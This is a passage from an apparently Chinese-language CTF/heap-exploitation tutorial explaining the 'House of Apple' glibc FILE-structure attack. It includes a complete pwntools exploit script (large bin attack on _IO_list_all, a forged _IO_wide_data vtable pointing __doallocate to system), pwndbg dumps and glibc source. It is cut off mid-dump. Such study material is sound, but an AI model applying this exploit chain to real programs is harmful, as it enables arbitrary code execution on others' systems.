   256   new_size = (obj_size + length) + (obj_size >> 3) + h->alignment_mask + 100;
   257   if (new_size < h->chunk_size)
   258     new_size = h->chunk_size;
   259 
   260   /* Allocate and initialize the new chunk.  */
 ► 261   new_chunk = CALL_CHUNKFUN (h, new_size);
 
 ► 0x772db807a1d7 <_obstack_newchunk+72>    call   qword ptr [rbx + 0x38]      <system>
        command: 0x772db8156d73 ◂— 0x68732f6e69622f /* '/bin/sh' */
```


### 1-34 house of apple其一

原作者[roderick](https://www.roderickchan.cn/zh-cn/house-of-apple-%E4%B8%80%E7%A7%8D%E6%96%B0%E7%9A%84glibc%E4%B8%ADio%E6%94%BB%E5%87%BB%E6%96%B9%E6%B3%95-1/)将其划分为3种类型，为了与其它house系列保持一致，笔者将其细分为了八种。

在glibc 2.24引入对`_IO_FILE_plus`虚表的严格检查后，一种被称为**House of Apple**的利用方法能够有效绕过该防护。其核心在于，**将堆漏洞提供的任意地址写原语，与glibc内部一个合法但非常规的IO跳转表（`_IO_wfile_jumps`及其变体）相结合**，构造一条能够通过验证的利用链。

完整的利用流程可系统地划分为以下三个阶段：

**阶段一：获取关键的原语**
首先，通过**Large Bin Attack**等堆利用技术，获得一次关键的**任意地址写**能力。此原语用于向一个关键全局地址（通常是`_IO_list_all`）写入一个可控的堆地址，这是启动后续利用的先决条件。

**阶段二：伪造IO结构并污染链表**
利用获得的写原语，执行以下核心操作：
1.  **劫持IO链表头**：将全局IO流链表头指针`_IO_list_all`的值，修改为指向一个在堆上预先精心布置的伪造`_IO_FILE_plus`结构。
2.  **设置合法虚表以绕过检查**：**（技术的核心与绕过关键）** 在该伪造的`_IO_FILE_plus`结构中，将其虚表（`vtable`）指针设置为glibc内部合法的 **`_IO_wfile_jumps`**符号地址。由于该地址位于glibc认可的合法vtable内存区间内，因此能通过严格的虚表范围检查。`_IO_wfile_jumps_mmap`或`_IO_wfile_jumps_maybe_mmap`可作为功能相同的替代品。
3.  **构造完整的伪造结构**：精确布置伪造的`_IO_FILE_plus`结构及其关联的`_IO_wide_data`结构中的字段：
    *   将`_IO_FILE_plus`结构中的`_wide_data`指针指向一个可控的、伪造的`_IO_wide_data`结构。
    *   在该伪造的`_IO_wide_data`结构中，将其虚表（`_wide_vtable`）指针指向一个可控的内存区域，并将`_wide_vtable`中的`__doallocate`函数项设置为目标函数地址（如`system`或`one_gadget`）。
    *   将`_IO_FILE_plus`结构中的`_flags`字段设置为特定值（例如`\365\347||sh`），以通过后续的路径检查并可能为`system`提供参数。

**阶段三：触发调用链执行代码**
最终，当程序因调用`abort()`、`exit()`或满足缓冲区刷新条件而触发`_IO_flush_all_lockp`函数时，该函数会遍历已被污染的IO链表。对于链表中伪造的文件流，其`_IO_OVERFLOW`函数指针实际将指向`_IO_wfile_jumps`表中的 **`_IO_wfile_overflow`**函数。通过精确控制伪造的结构字段，可以引导执行流程依次通过`_IO_wfile_overflow` -> `_IO_wdoallocbuf` -> `_IO_WDOALLOCATE`，最终调用`_wide_vtable->__doallocate`，从而将控制流导向指定的函数（如`system(“/bin/sh”)`），实现任意代码执行。

相关glibc完整源码参见[wfileops.c](https://elixir.bootlin.com/glibc/glibc-2.23/source/libio/wfileops.c#L441)：

```c
const struct _IO_jump_t _IO_wfile_jumps =
{
  JUMP_INIT_DUMMY,
  JUMP_INIT(finish, _IO_new_file_finish),
  JUMP_INIT(overflow, (_IO_overflow_t) _IO_wfile_overflow),
  JUMP_INIT(underflow, (_IO_underflow_t) _IO_wfile_underflow),
  JUMP_INIT(uflow, (_IO_underflow_t) _IO_wdefault_uflow),
  JUMP_INIT(pbackfail, (_IO_pbackfail_t) _IO_wdefault_pbackfail),
  JUMP_INIT(xsputn, _IO_wfile_xsputn),
  JUMP_INIT(xsgetn, _IO_file_xsgetn),
  JUMP_INIT(seekoff, _IO_wfile_seekoff),
  JUMP_INIT(seekpos, _IO_default_seekpos),
  JUMP_INIT(setbuf, _IO_new_file_setbuf),
  JUMP_INIT(sync, (_IO_sync_t) _IO_wfile_sync),
  JUMP_INIT(doallocate, _IO_wfile_doallocate),
  JUMP_INIT(read, _IO_file_read),
  JUMP_INIT(write, _IO_new_file_write),
  JUMP_INIT(seek, _IO_file_seek),
  JUMP_INIT(close, _IO_file_close),
  JUMP_INIT(stat, _IO_file_stat),
  JUMP_INIT(showmanyc, _IO_default_showmanyc),
  JUMP_INIT(imbue, _IO_default_imbue)
};
libc_hidden_data_def (_IO_wfile_jumps)


const struct _IO_jump_t _IO_wfile_jumps_mmap =
{
  JUMP_INIT_DUMMY,
  JUMP_INIT(finish, _IO_new_file_finish),
  JUMP_INIT(overflow, (_IO_overflow_t) _IO_wfile_overflow),
  JUMP_INIT(underflow, (_IO_underflow_t) _IO_wfile_underflow_mmap),
  JUMP_INIT(uflow, (_IO_underflow_t) _IO_wdefault_uflow),
  JUMP_INIT(pbackfail, (_IO_pbackfail_t) _IO_wdefault_pbackfail),
  JUMP_INIT(xsputn, _IO_wfile_xsputn),
  JUMP_INIT(xsgetn, _IO_file_xsgetn),
  JUMP_INIT(seekoff, _IO_wfile_seekoff),
  JUMP_INIT(seekpos, _IO_default_seekpos),
  JUMP_INIT(setbuf, _IO_file_setbuf_mmap),
  JUMP_INIT(sync, (_IO_sync_t) _IO_wfile_sync),
  JUMP_INIT(doallocate, _IO_wfile_doallocate),
  JUMP_INIT(read, _IO_file_read),
  JUMP_INIT(write, _IO_new_file_write),
  JUMP_INIT(seek, _IO_file_seek),
  JUMP_INIT(close, _IO_file_close_mmap),
  JUMP_INIT(stat, _IO_file_stat),
  JUMP_INIT(showmanyc, _IO_default_showmanyc),
  JUMP_INIT(imbue, _IO_default_imbue)
};

const struct _IO_jump_t _IO_wfile_jumps_maybe_mmap =
{
  JUMP_INIT_DUMMY,
  JUMP_INIT(finish, _IO_new_file_finish),
  JUMP_INIT(overflow, (_IO_overflow_t) _IO_wfile_overflow),
  JUMP_INIT(underflow, (_IO_underflow_t) _IO_wfile_underflow_maybe_mmap),
  JUMP_INIT(uflow, (_IO_underflow_t) _IO_wdefault_uflow),
  JUMP_INIT(pbackfail, (_IO_pbackfail_t) _IO_wdefault_pbackfail),
  JUMP_INIT(xsputn, _IO_wfile_xsputn),
  JUMP_INIT(xsgetn, _IO_file_xsgetn),
  JUMP_INIT(seekoff, _IO_wfile_seekoff),
  JUMP_INIT(seekpos, _IO_default_seekpos),
  JUMP_INIT(setbuf, _IO_file_setbuf_mmap),
  JUMP_INIT(sync, (_IO_sync_t) _IO_wfile_sync),
  JUMP_INIT(doallocate, _IO_wfile_doallocate),
  JUMP_INIT(read, _IO_file_read),
  JUMP_INIT(write, _IO_new_file_write),
  JUMP_INIT(seek, _IO_file_seek),
  JUMP_INIT(close, _IO_file_close),
  JUMP_INIT(stat, _IO_file_stat),
  JUMP_INIT(showmanyc, _IO_default_showmanyc),
  JUMP_INIT(imbue, _IO_default_imbue)
};

wint_t
_IO_wfile_overflow (_IO_FILE *f, wint_t wch)
{
  if (f->_flags & _IO_NO_WRITES) /* SET ERROR */
    {
      f->_flags |= _IO_ERR_SEEN;
      __set_errno (EBADF);
      return WEOF;
    }
  /* If currently reading or no buffer allocated. */
  if ((f->_flags & _IO_CURRENTLY_PUTTING) == 0)
    {
      /* Allocate a buffer if needed. */
      if (f->_wide_data->_IO_write_base == 0)
	{
	  _IO_wdoallocbuf (f);
	  _IO_wsetg (f, f->_wide_data->_IO_buf_base,
		     f->_wide_data->_IO_buf_base, f->_wide_data->_IO_buf_base);

	  if (f->_IO_write_base == NULL)
	    {
	      _IO_doallocbuf (f);
	      _IO_setg (f, f->_IO_buf_base, f->_IO_buf_base, f->_IO_buf_base);
	    }
	}
      else
	{
	  /* Otherwise must be currently reading.  If _IO_read_ptr
	     (and hence also _IO_read_end) is at the buffer end,
	     logically slide the buffer forwards one block (by setting
	     the read pointers to all point at the beginning of the
	     block).  This makes room for subsequent output.
	     Otherwise, set the read pointers to _IO_read_end (leaving
	     that alone, so it can continue to correspond to the
	     external position). */
	  if (f->_wide_data->_IO_read_ptr == f->_wide_data->_IO_buf_end)
	    {
	      f->_IO_read_end = f->_IO_read_ptr = f->_IO_buf_base;
	      f->_wide_data->_IO_read_end = f->_wide_data->_IO_read_ptr =
		f->_wide_data->_IO_buf_base;
	    }
	}
      f->_wide_data->_IO_write_ptr = f->_wide_data->_IO_read_ptr;
      f->_wide_data->_IO_write_base = f->_wide_data->_IO_write_ptr;
      f->_wide_data->_IO_write_end = f->_wide_data->_IO_buf_end;
      f->_wide_data->_IO_read_base = f->_wide_data->_IO_read_ptr =
	f->_wide_data->_IO_read_end;

      f->_IO_write_ptr = f->_IO_read_ptr;
      f->_IO_write_base = f->_IO_write_ptr;
      f->_IO_write_end = f->_IO_buf_end;
      f->_IO_read_base = f->_IO_read_ptr = f->_IO_read_end;

      f->_flags |= _IO_CURRENTLY_PUTTING;
      if (f->_flags & (_IO_LINE_BUF | _IO_UNBUFFERED))
	f->_wide_data->_IO_write_end = f->_wide_data->_IO_write_ptr;
    }
  if (wch == WEOF)
    return _IO_do_flush (f);
  if (f->_wide_data->_IO_write_ptr == f->_wide_data->_IO_buf_end)
    /* Buffer is really full */
    if (_IO_do_flush (f) == EOF)
      return WEOF;
  *f->_wide_data->_IO_write_ptr++ = wch;
  if ((f->_flags & _IO_UNBUFFERED)
      || ((f->_flags & _IO_LINE_BUF) && wch == L'\n'))
    if (_IO_do_flush (f) == EOF)
      return WEOF;
  return wch;
}
libc_hidden_def (_IO_wfile_overflow)

void
_IO_wdoallocbuf (_IO_FILE *fp)
{
  if (fp->_wide_data->_IO_buf_base)
    return;
  if (!(fp->_flags & _IO_UNBUFFERED))
    if ((wint_t)_IO_WDOALLOCATE (fp) != WEOF)
      return;
  _IO_wsetb (fp, fp->_wide_data->_shortbuf,
		     fp->_wide_data->_shortbuf + 1, 0);
}
libc_hidden_def (_IO_wdoallocbuf)

#define _IO_WDOALLOCATE(FP) WJUMP0 (__doallocate, FP)
#define WJUMP0(FUNC, THIS) (_IO_WIDE_JUMPS_FUNC(THIS)->FUNC) (THIS)
```

本方法的执行最终依赖于glibc内部一条确定的错误处理与IO刷新路径。具体而言，可通过触发堆分配器错误（例如双重释放）来引导程序调用 **`malloc_printerr`** 函数。该函数在处理错误时，会调用 **`_IO_flush_all_lockp`** 以强制刷新所有已注册的IO流缓冲区。

`_IO_flush_all_lockp` 函数会遍历由 `_IO_list_all` 管理的全局IO链表，并对其中每个文件流调用其虚表（vtable）中定义的 **`_IO_OVERFLOW`** 函数。由于利用链已事先将伪造的 `_IO_FILE_plus` 结构插入此链表，并将其虚表设置为 **`_IO_wfile_jumps`**，因此实际被调用的 `_IO_OVERFLOW` 实现即为该表中的 **`_IO_wfile_overflow`** 函数。

后续的函数调用链与作用如下：
*   **`_IO_wfile_overflow`**：这是虚表调用的入口点。它会检查对应`_IO_FILE`结构中的`_wide_data`及相关标志位，如果判断需要为宽字符流分配缓冲区，则会调用`_IO_wdoallocbuf`。
*   **`_IO_wdoallocbuf`**：此函数负责准备或执行宽字符流缓冲区的分配。其核心操作是调用`_IO_WDOALLOCATE`。
*   **`_IO_WDOALLOCATE`**：这并非一个独立的函数，而是`_IO_wide_data`结构关联的虚表（`_wide_vtable`）中的一个函数指针项。在正常流程中，它指向 **`__doallocate`** 函数。
*   **`__doallocate`**：这是最终被调用的目标函数。通过完全控制伪造的`_IO_wide_data`结构及其`_wide_vtable`，可以将`_IO_WDOALLOCATE`（即`_wide_vtable`中的`__doallocate`项）设置为任意目标地址（如`system`或`one_gadget`）。

因此，从触发错误到执行任意代码的完整控制流路径为： **`malloc_printerr` → `_IO_flush_all_lockp` → `_IO_OVERFLOW` (`_IO_wfile_overflow`) → `_IO_wdoallocbuf` → `_IO_WDOALLOCATE` (`_wide_vtable->__doallocate`) → 可控制的函数**。通过将`_wide_vtable->__doallocate`指向预定目标，即可实现最终的代码执行。

测试的二进制源码参考[binary.c](https://github.com/BinRacer/pwn4heap/tree/master/src/2.23/binary/14/binary.c)，相关exoloit.py完整内容可见[exploit.py](https://github.com/BinRacer/pwn4heap/blob/master/src/2.23/house_of_apple_one/exploit.py)。

核心利用代码如下：

```python
# house of apple one
conn.sendafter(b"Enter author name: ", b"A" * 0x8)
malloc(0, 0x420)
malloc(1, 0x500)
malloc(2, 0x400)
delete(0)
malloc(3, 0x500)
content = show(0)
main_arena1096 = u64(content[:6].ljust(8, b"\x00"))
log.info(f"main_arena+1096: {hex(main_arena1096)}")
libc.address = main_arena1096 - 0x38DF68
log.info(f"libc base: {hex(libc.address)}")
system = libc.sym["system"]
log.info(f"system addr: {hex(system)}")
_IO_wfile_jumps = libc.sym["_IO_wfile_jumps"]
log.info(f"_IO_wfile_jumps addr: {hex(_IO_wfile_jumps)}")
_IO_list_all = libc.sym["_IO_list_all"]
log.info(f"_IO_list_all addr: {hex(_IO_list_all)}")

payload = b"A" * 0x10 + b"A"
edit(0, len(payload), payload)
content = show(0)
chunk0_addr = u64(content[0x10 : 0x10 + 6].ljust(8, b"\x00")) - ord("A")
log.info(f"chunk0 addr: {hex(chunk0_addr)}")
chunk2_addr = chunk0_addr + 0x420 + 0x10 + 0x500 + 0x10
log.info(f"chunk2 addr: {hex(chunk2_addr)}")

delete(2)
payload = p64(main_arena1096) + p64(_IO_list_all - 0x10)
payload += p64(chunk0_addr) + p64(_IO_list_all - 0x20)
edit(0, len(payload), payload)
malloc(4, 0x500)

# pwndbg> p/x (uint16_t)~(2 | 0x8 | 0x800)
# $2 = 0xf7f5
# pwndbg>
payload = b"\x00" * 0x500 + b"\xf5\xf7||sh\x00\x00"
edit(1, len(payload), payload)

fake_wide_data = b"\x00" * 0x18 + p64(0)
fake_wide_data = fake_wide_data.ljust(0x30, b"\x00") + p64(0)
fake_wide_data = fake_wide_data.ljust(0x130, b"\x00") + p64(chunk0_addr + 0x200)
payload = b"\x00" * 0x20 + fake_wide_data
fake_wide_vtable = b"\x00" * 0x68 + p64(system)
payload = payload.ljust(0x200 - 0x10, b"\x00") + fake_wide_vtable
edit(0, len(payload), payload)

fake_io = b"\x00" * (0x20 - 0x10) + p64(2)
fake_io = fake_io.ljust(0x28 - 0x10, b"\x00") + p64(3)
fake_io = fake_io.ljust(0xA0 - 0x10, b"\x00") + p64(chunk0_addr + 0x30)
fake_io = fake_io.ljust(0xC0 - 0x10) + p64(0)
fake_io = fake_io.ljust(0xD8 - 0x10, b"\x00") + p64(_IO_wfile_jumps)
edit(2, len(fake_io), fake_io)
delete(0)
conn.recvline()
conn.recvline()
cmd = b"cat src/2.23/house_of_apple_one/flag\x00"
conn.sendline(cmd)
flag = conn.recvline().decode().strip()
log.success(f"flag: {format_flag(flag)}")
```

在glibc堆利用中，通过操控堆块在不同容器间的转移来泄露关键地址是一种基础且重要的技术。以下操作序列旨在引导一个堆块从**unsorted bin**迁入**large bin**，并利用large bin特有的元数据布局，同时泄露**libc基址**与**堆内存起始地址**。

**步骤一：构造初始堆布局**
连续分配三个堆块：`chunk[0]`、`chunk[1]`和`chunk[2]`。令`chunk[1]`位于`chunk[0]`与`chunk[2]`之间，以防止它们物理相邻而合并。一个关键条件是确保`chunk[0]`的尺寸大于`chunk[2]`的尺寸，这使`chunk[0]`足够大，以便后续能被归类到large bin（通常指尺寸不小于1024字节的块，具体阈值因环境和版本而异）。

**步骤二：制造Unsorted Bin中的指针**
释放`chunk[0]`。由于其尺寸较大，不属于fast bin的管理范围，且不与top chunk相邻，因此它被放入**unsorted bin**——一个全局的双向循环链表。此时，分配器会将`chunk[0]`的`fd`和`bk`指针设置为指向`main_arena`结构内部的特定地址（如`main_arena+88`）。该地址与libc的加载基址之间存在一个固定的偏移量。

**步骤三：引导块转入Large Bin**
接着，程序申请一个尺寸大于`chunk[0]`的新堆块`chunk[3]`。由于unsorted bin中唯一的块`chunk[0]`尺寸不足，分配器会对其进行整理。根据其大小，`chunk[0]`被从unsorted bin中移除，并插入到对应的**large bin**链表中。

**步骤四：捕获Large Bin中的特殊指针**
在large bin中，每个块除维护标准的双向链表指针`fd`和`bk`外，还包含一对用于在大小不同的块间快速索引的`fd_nextsize`和`bk_nextsize`指针。当`chunk[0]`被放入一个空的large bin，或成为该尺寸区间内的唯一（或首个）块时，其`fd_nextsize`和`bk_nextsize`指针会被初始化为指向其自身地址。此时，`chunk[0]`的元数据区包含两类关键指针：
- `fd`与`bk`：指向`main_arena`中的地址（**与libc相关**）。
- `fd_nextsize`与`bk_nextsize`：指向`chunk[0]`自身的地址（**即堆地址**）。

**步骤五：提取并计算关键地址**
最后，通过程序提供的读取功能（例如`show(0)`）输出已被释放的`chunk[0]`的用户数据。由于该块处于空闲状态，其用户数据区起始部分已被上述指针覆盖。因此，可以从输出中解析出：
- 从`fd`或`bk`的值，计算出`main_arena`的地址，进而推算出**libc的基址**。
- 从`fd_nextsize`或`bk_nextsize`的值，直接得到**该堆块所在的堆内存地址**。

至此，无需任何初始地址信息，即可同时获取后续利用所必需的libc基址和堆地址。该技术本质上是利用了glibc分配器在管理large bin时对特定指针的初始化逻辑，将常规的内存操作转化为信息泄露的可靠渠道。

```bash
pwndbg> heap
Free chunk (largebins) | PREV_INUSE
Addr: 0x63c1c5be4000
Size: 0x430 (with flag bits: 0x431)
fd: 0x7d42d318df68
bk: 0x7d42d318df68
fd_nextsize: 0x63c1c5be4000
bk_nextsize: 0x63c1c5be4000

Allocated chunk
Addr: 0x63c1c5be4430
Size: 0x510 (with flag bits: 0x510)

Allocated chunk | PREV_INUSE
Addr: 0x63c1c5be4940
Size: 0x410 (with flag bits: 0x411)

Allocated chunk | PREV_INUSE
Addr: 0x63c1c5be4d50
Size: 0x510 (with flag bits: 0x511)

Top chunk | PREV_INUSE
Addr: 0x63c1c5be5260
Size: 0x1fda0 (with flag bits: 0x1fda1)

pwndbg> largebins 
largebins
0x400-0x430: 0x63c1c5be4000 —▸ 0x7d42d318df68 (main_arena+1096) ◂— 0x63c1c5be4000
pwndbg> 
```

在完成libc与堆地址泄露后，利用流程进入关键的布局阶段。为了后续成功触发**Large Bin Attack**，需要执行以下两项核心操作：

**步骤一：将`chunk[2]`置入Unsorted Bin**
首先，释放之前用于隔离的`chunk[2]`。由于它的尺寸通常也超出fast bin范围且不与top chunk相邻，因此被插入**unsorted bin**。此时，`chunk[2]`成为一个“游离”在unsorted bin中的空闲块，为后续作为利用操作的载体（victim）做好准备。

**步骤二：污染Large Bin中的`chunk[0]`指针**
利用已获得的堆地址写原语，修改仍位于**large bin**中的`chunk[0]`的两个关键后向指针：
*   将`chunk[0]`的`bk`指针修改为`_IO_list_all - 0x10`。
*   将`chunk[0]`的`bk_nextsize`指针修改为`_IO_list_all - 0x20`。

这里的`_IO_list_all`是glibc中管理所有打开文件流（`FILE`结构）的全局链表头指针。通过上述篡改，当分配器后续将unsorted bin中的`chunk[2]`整理并插入到`chunk[0]`所在的large bin链表时，会遵循这两个被污染的指针进行计算，从而将`chunk[2]`的堆地址写入`_IO_list_all`附近的关键位置，为后续的IO流利用（如House of Apple）铺平道路。这是执行Large Bin Attack，并最终实现任意地址写（通常针对`_IO_list_all`）前最后的、必要的内存状态配置。

```bash
pwndbg> unsortedbin 
unsortedbin
all: 0x63c1c5be4940 —▸ 0x7d42d318db78 (main_arena+88) ◂— 0x63c1c5be4940
pwndbg> largebins 
largebins
0x400-0x430 [corrupted]
FD: 0x63c1c5be4000 —▸ 0x7d42d318df68 (main_arena+1096) ◂— 0x63c1c5be4000
BK: 0x63c1c5be4000 —▸ 0x7d42d318e530 ◂— 0
pwndbg> x/6gx 0x63c1c5be4000
0x63c1c5be4000: 0x0000000000000000      0x0000000000000431
0x63c1c5be4010: 0x00007d42d318df68      0x00007d42d318e530
0x63c1c5be4020: 0x000063c1c5be4000      0x00007d42d318e520
pwndbg> x/1gx &_IO_list_all
0x7d42d318e540 <__GI__IO_list_all>:     0x00007d42d318e560
pwndbg> 
```

在完成对large bin中`chunk[0]`关键指针的篡改后，利用流程进入最终的触发阶段。此时内存状态为：`chunk[2]`作为空闲块位于**unsorted bin**中，而`chunk[0]`位于**large bin**中且其`bk`和`bk_nextsize`指针已被分别污染为`_IO_list_all - 0x10`与`target2`（例如`_IO_list_all - 0x20`或`global_max_fast`）。

**步骤：分配特定块以双重触发**
程序申请一个新的内存块`chunk[4]`。其大小`size`必须满足两个条件：
1.  `chunk[4]->size > chunk[2]->size`：确保位于unsorted bin中的`chunk[2]`（victim）无法直接满足此次分配。
2.  `chunk[4]->size > chunk[0]->size`：确保在large bin中，`chunk[0]`的尺寸也不足，迫使分配器将`chunk[2]`整理并插入`chunk[0]`所在的large bin链表。

**双重写入机制与结果**
当分配器尝试响应这次较大的`chunk[4]`请求时，它会将`chunk[2]`（victim）从unsorted bin中摘下，并插入`chunk[0]`所在的large bin链表。此插入过程会触发分配器执行以下两次关键的指针操作，从而完成两次独立的任意地址写：

1.  **第一次写入（通过`bk`指针）**：
    执行操作 `victim->bk->fd = victim`。
    由于`victim`（即`chunk[2]`）的`bk`指针继承了其前驱块（即被污染的`chunk[0]`）的`bk`值（`_IO_list_all - 0x10`），该操作等价于 `*(_IO_list_all - 0x10 + 0x10) = victim`，即 **`*_IO_list_all = victim`**。
    **结果**：全局IO流链表头指针`_IO_list_all`被成功修改为`chunk[2]`的堆地址。这为后续伪造IO_FILE结构并劫持控制流（如House of Apple）铺平了道路。

2.  **第二次写入（通过`bk_nextsize`指针）**：
    执行操作 `victim->bk_nextsize->fd_nextsize = victim`。
    同理，`victim`的`bk_nextsize`指针继承了`chunk[0]`被污染的`bk_nextsize`值（`target2`）。该操作等价于 `*(target2 + 0x20) = victim`。
    **结果**：在`target2 + 0x20`处写入`chunk[2]`的堆地址。此目标地址`target2`可根据利用策略灵活选择：若设为`_IO_list_all - 0x20`，可用于辅助构造伪造的IO_FILE结构；若设为`global_max_fast`，则能将fast bin的最大尺寸阈值扩大为一个极大的堆地址，从而扰乱堆分配器的行为，为后续利用创造更多条件。

至此，单次Large Bin Attack成功触发了 **两次独立的任意地址写**，不仅完成了对关键全局指针`_IO_list_all`的劫持，还能额外篡改另一个选定目标的内存值，极大地增强了后续漏洞利用的灵活性和控制力。

```bash
pwndbg> x/1gx &_IO_list_all 
0x7d42d318e540 <__GI__IO_list_all>:     0x000063c1c5be4940
pwndbg> x/10gx chunks
0x63c1a0ee0060 <chunks>:        0x0000000000000020      0x000063c1c5be4010
0x63c1a0ee0070 <chunks+16>:     0x0000000000000500      0x000063c1c5be4440
0x63c1a0ee0080 <chunks+32>:     0x0000000000000400      0x000063c1c5be4950
0x63c1a0ee0090 <chunks+48>:     0x0000000000000500      0x000063c1c5be4d60
0x63c1a0ee00a0 <chunks+64>:     0x0000000000000500      0x000063c1c5be5270
pwndbg> 
```

在成功将`_IO_list_all`全局指针劫持为`chunk[2]`的堆地址后，利用流程进入最关键的结构伪造阶段。此时，需在`chunk[2]`的用户数据区精心构造一个伪造的 **`_IO_FILE_plus`** 结构体，以引导后续的IO函数调用链执行任意代码。

**伪造`_IO_FILE_plus`结构体的核心字段如下：**

1.  **设置`_flags`字段**：
    将其值设置为`b"\xf5\xf7||sh\x00\x00"`（对应十六进制`0x0068737c7c7cf7f5`）。此值的设置具有双重目的：
    *   **绕过标志位检查**：其比特位经过精心设计，旨在满足`_IO_wfile_overflow`等函数内部对文件流状态（如`_IO_CURRENTLY_PUTTING`、`_IO_NO_WRITES`等）的校验，确保执行流能顺利进入目标分支。
    *   **嵌入命令参数**：字节序列中隐含的字符串`"sh"`，为后续将控制流导向`system`函数时，直接提供其所需的参数（`/bin/sh`）创造了条件。

2.  **设置虚表（`vtable`）指针**：
    将伪造结构的虚表指针指向glibc内部合法的符号地址 **`_IO_wfile_jumps`**。这是**绕过glibc vtable范围检查的关键**。由于该地址位于libc中合法的vtable内存区间内，因此能通过安全验证。此设置使得该伪造文件流的`_IO_OVERFLOW`函数指针实际指向`_IO_wfile_jumps`表中的`_IO_wfile_overflow`函数，从而进入预设的利用路径。

3.  **设置`_wide_data`指针**：
    将此指针指向另一处可控的内存区域，例如`p64(chunk0_addr + 0x30)`（即`chunk[0]`地址加上偏移）。其目的是在该处（`chunk[0] + 0x30`） **伪造一个`_IO_wide_data`结构**。在该伪造的`_IO_wide_data`结构中，将进一步控制其虚表（`_wide_vtable`），并将`_wide_vtable`中的`__doallocate`函数项设置为目标函数地址（如`system`或`one_gadget`）。

**总结**：此阶段的核心是在被`_IO_list_all`指向的`chunk[2]`上，布置一个“合法”的`_IO_FILE_plus`外壳。通过精心设置`_flags`绕过初步检查，通过指向合法`_IO_wfile_jumps`通过vtable校验，再通过`_wide_data`将控制流引向另一处完全可控的“数据”区域（伪造的`_IO_wide_data`），从而为最终劫持控制流（`__doallocate`）完成全部数据准备。

```bash
pwndbg> p/x *(struct _IO_FILE_plus*)_IO_list_all
$1 = {
  file = {
    _flags = 0x7c7cf7f5,
    _IO_read_ptr = 0x411,
    _IO_read_end = 0x0,
    _IO_read_base = 0x0,
    _IO_write_base = 0x2,
    _IO_write_ptr = 0x3,
    _IO_write_end = 0x0,
    _IO_buf_base = 0x0,
    _IO_buf_end = 0x0,
    _IO_save_base = 0x0,
    _IO_backup_base = 0x0,
    _IO_save_end = 0x0,
    _markers = 0x0,
    _chain = 0x0,
    _fileno = 0x0,
    _flags2 = 0x0,
    _old_offset = 0x0,
    _cur_column = 0x0,
    _vtable_offset = 0x0,
    _shortbuf = {0x0},
    _lock = 0x0,
    _offset = 0x0,
    _codecvt = 0x0,
    _wide_data = 0x63c1c5be4030,
    _freeres_list = 0x2020202020202020,
    _freeres_buf = 0x2020202020202020,
    __pad5 = 0x2020202020202020,
    _mode = 0x0,
    _unused2 = {0x0 <repeats 20 times>}
  },
  vtable = 0x7d42d318c260
}
pwndbg> x/1gx &_IO_wfile_jumps
0x7d42d318c260 <__GI__IO_wfile_jumps>:  0x0000000000000000
pwndbg> p/x *(struct _IO_jump_t*)_IO_wfile_jumps
$2 = {
  __dummy = 0x0,
  __dummy2 = 0x0,
  __finish = 0x7d42d2e6c263,
  __overflow = 0x7d42d2e67587,
  __underflow = 0x7d42d2e66561,
  __uflow = 0x7d42d2e655fa,
  __pbackfail = 0x7d42d2e65405,
  __xsputn = 0x7d42d2e67926,
  __xsgetn = 0x7d42d2e6bf4c,
  __seekoff = 0x7d42d2e66d64,
  __seekpos = 0x7d42d2e6d997,
  __setbuf = 0x7d42d2e6b2db,
  __sync = 0x7d42d2e677e1,
  __doallocate = 0x7d42d2e61d6f,
  __read = 0x7d42d2e6bbf9,
  __write = 0x7d42d2e6bc56,
  __seek = 0x7d42d2e6b9c0,
  __close = 0x7d42d2e6b1f5,
  __stat = 0x7d42d2e6bc3d,
  __showmanyc = 0x7d42d2e6e485,
  __imbue = 0x7d42d2e6e48b
}
pwndbg> p/x &_IO_wfile_overflow
$3 = 0x7d42d2e67587
pwndbg> 
```

在`chunk[0]`对应的可控堆内存区域中，需要精确构造一个伪造的 **`_IO_wide_data`** 结构体。此结构体是引导控制流至目标函数的关键。具体布局如下：

**1. 内存布局设计**
将伪造的`_IO_wide_data`结构体本身布置在`chunk0_addr + 0x30`的地址。而该结构所关联的虚表指针`_wide_vtable`，则指向同一堆块内的另一个可控偏移地址，例如`chunk0_addr + 0x200`。**这种将核心数据结构与其虚表紧凑布置在同一个堆块（`chunk[0]`）内的设计**，最大限度地利用了已掌控的内存区域，减少了对额外内存写原语或复杂布局的依赖，从而提升了利用的可靠性和简洁性。

**2. 设置最终的执行目标**
在位于`chunk0_addr + 0x200`的伪造`_wide_vtable`中，将其 **`__doallocate`** 函数指针项设置为最终希望执行的函数地址。这通常是以下两种之一：
- **`system`函数的地址**：用于执行系统命令。当控制流抵达时，结合伪造`_IO_FILE_plus`中`_flags`字段嵌入的`"sh"`字符串，可实现调用`system("/bin/sh")`。
- 或一个合适的 **`one_gadget`** 地址：用于直接跳转到libc中一段能够执行shell的现有代码片段。

**总结**：此步骤通过在可控堆块内精心组装`_IO_wide_data`及其虚表，并将虚表中的`__doallocate`项指向最终的目标函数，为整个利用链的终点——即当IO函数调用链执行`_wide_vtable->__doallocate`时——实现任意代码执行，完成了全部数据准备。这种紧凑布局是利用此技术时一种常见且高效的技巧。

```bash
pwndbg> p/x *(struct _IO_wide_data*)0x63c1c5be4030
$4 = {
  _IO_read_ptr = 0x0,
  _IO_read_end = 0x0,
  _IO_read_base = 0x0,
  _IO_write_base = 0x0,
  _IO_write_ptr = 0x0,
  _IO_write_end = 0x0,
  _IO_buf_base = 0x0,
  _IO_buf_end = 0x0,
  _IO_save_base = 0x0,
  _IO_backup_base = 0x0,
  _IO_save_end = 0x0,
  _IO_state = {
    __count = 0x0,
    __value = {
      __wch = 0x0,
      __wchb = {0x0, 0x0, 0x0, 0x0}
    }
  },
  _IO_last_state = {
    __count = 0x0,
    __value = {
      __wch = 0x0,
      __wchb = {0x0, 0x0, 0x0, 0x0}
    }
  },
  _codecvt = {
    __codecvt_destr = 0x0,
    __codecvt_do_out = 0x0,
    __codecvt_do_unshift = 0x0,
    __codecvt_do_in = 0x0,
    __codecvt_do_encoding = 0x0,
    __codecvt_do_always_noconv = 0x0,
    __codecvt_do_length = 0x0,
    __codecvt_do_max_length = 0x0,
    __cd_in = {
          __invocation_counter = 0x0,
          __internal_use = 0x0,
          __statep = 0x0,
          __state = {
            __count = 0x0,
            __value = {
              __wch = 0x0,
              __wchb = {0x0, 0x0, 0x0, 0x0}
            }
          }
        }
      }
    },
    __cd_out = {
      __cd = {
        __nsteps = 0x0,
        __steps = 0x0,
        __data = 0x63c1c5be4128
      },
      __combined = {
        __cd = {
          __nsteps = 0x0,
          __steps = 0x0,
          __data = 0x63c1c5be4128
        },
